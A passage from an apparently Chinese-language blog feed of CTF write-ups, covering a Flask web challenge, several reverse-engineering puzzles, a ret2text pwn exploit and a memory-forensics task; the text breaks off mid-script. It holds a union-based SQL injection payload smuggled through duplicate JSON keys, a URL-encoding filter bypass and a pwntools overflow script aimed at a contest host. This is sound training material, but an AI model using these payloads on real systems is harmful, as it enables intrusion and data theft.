class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listAll</span>():</span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">healthCheck</span>():</span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>发现其中存在两个点需要绕过：</p><ol><li>路由 <code>/search</code> 中JSON严格过滤，<code>name</code> 的值必须满足 <code>isalnum()</code>，<code>votes</code> 的值必须为数字，避免SQL注入情况；</li><li>检测url里使用GET方法传入 <code>action=readFlag</code> 会直接拒绝。</li></ol><p>对于第1点，尝试构造含两个 <code>name</code> 参数的JSON，在python中认JSON中第二个 <code>name</code>，而go中认JSON中第一个 <code>name</code>，利用这种差异构造：<code>&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;</code>，绕过得到token值，得到 <code>re@l1y_4th_T0k3n</code>。</p><p>对于第2点，利用 <code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code> 特性，对 <code>?</code> 进行url编码可以在python层面绕过GET参数识别，即 <code>action = request.args.get(&#39;action&#39;)</code> 不会获取到内容，payload：<code>/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n</code>。</p><p>得到flag：<code>&quot;&#123;\&quot;msg\&quot;:\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\n\&quot;&#125;\n&quot;</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="hiahia-o-▽-┛"><a href="#hiahia-o-▽-┛" class="headerlink" title="hiahia o(*^▽^*)┛"></a>hiahia o(*^▽^*)┛</h3><p>IDA查看伪码，无逆向，照着实现就行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">list</span>(<span class="string">b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">c,k</span>):</span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">11</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">13</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">5</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    t+=<span class="built_in">chr</span>(flag(s[i],i))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h3><p>jadx查看MainActivity主逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">trim</span> <span class="operator">=</span> <span class="built_in">this</span>.input.getText().toString().trim();</span><br><span class="line"><span class="type">int</span>[] iArr = &#123;<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] iArr2 = &#123;<span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (trim.length() != <span class="number">18</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAG错误&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>[] charArray = trim.toCharArray();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">iArr2[i] = i % <span class="number">2</span> == <span class="number">0</span> ? charArray[i] ^ i : charArray[i] ^ charArray[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">18</span>; i2++) &#123;</span><br><span class="line">str = str.concat(Integer.toHexString(iArr2[i2])).concat(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(str);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>; i3 &lt; <span class="number">18</span>; i3++) &#123;</span><br><span class="line"><span class="keyword">if</span> (iArr2[i3] != iArr[i3]) &#123;</span><br><span class="line"><span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAG错误！&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.input.setText(<span class="string">&quot;FLAG正确&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用z3解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">7</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">out=[<span class="number">102</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">127</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">121</span>, <span class="number">58</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">42</span>]</span><br><span class="line"></span><br><span class="line">s=[<span class="number">42</span>]*<span class="number">19</span></span><br><span class="line">ss=Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        s[i]=flag[i]^i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s[i]=flag[i]^flag[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    ss.add(s[i]==out[i])</span><br><span class="line"></span><br><span class="line">ss.check()</span><br><span class="line">m=ss.model()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    res+=(<span class="built_in">chr</span>(m[flag[i]].as_long()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;Reverse__APP</span></span><br></pre></td></tr></table></figure><p>加花括号闭合，得到flag：flag{Reverse__APP}</p><p>​    </p><h3 id="WAY"><a href="#WAY" class="headerlink" title="WAY"></a>WAY</h3><blockquote><p>flag{md5(result)}</p></blockquote><p>检测带upx壳，脱壳后IDA查看伪码，迷宫题，wsad代表上下左右，提取迷宫数组得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OIIII</span><br><span class="line">OOIO#</span><br><span class="line">IOOOI</span><br><span class="line">IOIOI</span><br><span class="line">IIIII</span><br></pre></td></tr></table></figure><p>容易得到路径：sdsddwd，MD5得到flag：flag{6654b3343f6f3f6223a721e7f65e87f8}</p><p>​    </p><h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>Sparc架构，IDA无法反编译为伪码，用Ghidra得到伪码主逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  longlong unaff_g7;</span><br><span class="line">  <span class="type">int</span> local_res7d3;</span><br><span class="line">  undefined8 local_res7d7;</span><br><span class="line">  undefined8 local_res7df;</span><br><span class="line">  undefined8 local_res7e7;</span><br><span class="line">  undefined8 local_res7ef;</span><br><span class="line">  longlong local_res7f7;</span><br><span class="line">  </span><br><span class="line">  local_res7f7 = *(longlong *)(unaff_g7 + <span class="number">0x28</span>);</span><br><span class="line">  local_res7d7 = <span class="number">0</span>;</span><br><span class="line">  local_res7df = <span class="number">0</span>;</span><br><span class="line">  local_res7e7 = <span class="number">0x37463f3044413243</span>;</span><br><span class="line">  local_res7ef = <span class="number">0x3429000000000000</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input_sparkle_flag_here:\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,&amp;local_res7d7,<span class="number">0xc</span>);</span><br><span class="line">  local_res7d3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> &lt; local_res7d3) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good_job!&quot;</span>);</span><br><span class="line">LAB_001008a0:</span><br><span class="line">      <span class="keyword">if</span> (local_res7f7 == *(longlong *)(unaff_g7 + <span class="number">0x28</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      __stack_chk_fail();</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) =</span><br><span class="line">         *(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + <span class="number">-0x2f</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) !=</span><br><span class="line">        *(<span class="type">char</span> *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;incorrect\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LAB_001008a0;</span><br><span class="line">    &#125;</span><br><span class="line">    local_res7d3 = local_res7d3 + <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为输入flag值逐字符 <code>-0x2f</code> 得到的字符串与 <code>0x37463f30444132433429</code> 相等，即ROT47。</p><p>简单还原得flag：flag{fun_sparcX}</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Ez-pwn"><a href="#Ez-pwn" class="headerlink" title="Ez_pwn"></a>Ez_pwn</h3><p>简单ret2text：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;hsc2019.site&#x27;</span>,<span class="number">10891</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x400741</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;本届HSC1th 2022是由社会战队红客突击队（Honker Security Commando）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web，crypto，misc，re等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>长安“战疫”网络安全卫士守护赛</title>
    <link href="https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/</id>
    <published>2022-01-08T10:00:01.000Z</published>
    <updated>2022-01-08T12:51:09.214Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装成“肺炎病例”“防护通知”等信息，通过钓鱼邮件、恶意链接等方式进行传播，造成用户安全问题。</p><p>西安数所高校学生团体联合发起长安战疫网络安全公益科普赛和长安战疫“网络安全卫士”守护赛，一方面提升全民疫情期间的网络安全意识与疫情中常见问题的应对措施，另一方面提升我省的网络安全应急响应能力和网络安全从业者技术能力，协助用户提升网络安全防护能力，为战胜新冠肺炎提供网络空间保障。</p><p>Rank: 14</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="八卦迷宫"><a href="#八卦迷宫" class="headerlink" title="八卦迷宫"></a>八卦迷宫</h3><blockquote><p>一起走迷宫吧，要提交全拼音字符奥</p></blockquote><p><img src="/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/maze.png" alt="maze" style="zoom: 33%;"></p><p>走迷宫，串联经过的八卦对应文字：<code>cazy&#123;战长恙长战恙河长山山安战疫疫战疫安疫长安恙&#125;</code>，转为全拼：</p><p><code>cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</code></p><p>​    </p><h3 id="朴实无华的取证"><a href="#朴实无华的取证" class="headerlink" title="朴实无华的取证"></a>朴实无华的取证</h3><p>xp内存取证，先判断profile</p><p><code>volatility -f xp_sp3.raw imageinfo</code></p><p>查看进程 </p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist</code></p><p>发现notepad和mspaint，查看记事本</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad</code></p><p>找到信息： <code>20211209(Encrypt)</code>。</p><p>再查看桌面文件</p><p><code>volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;桌面&quot;</code></p><p>找到文件 <code>flag.zip</code> 和 <code>flag.png</code>，分别dump下来</p><p><code>flag.png</code> 中有密文信息： <code>FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]</code>，</p><p><code>flag.zip</code> 有密码，用前面的 <code>20211209</code> 解开找到加密算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="built_in">string</span>&amp; str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(str[i] &gt;=<span class="string">&#x27;a&#x27;</span>&amp;&amp; str[i]&lt;=<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">str[i]+=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(str[i]==<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">str[i]=<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">str[i] -= <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还原flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x 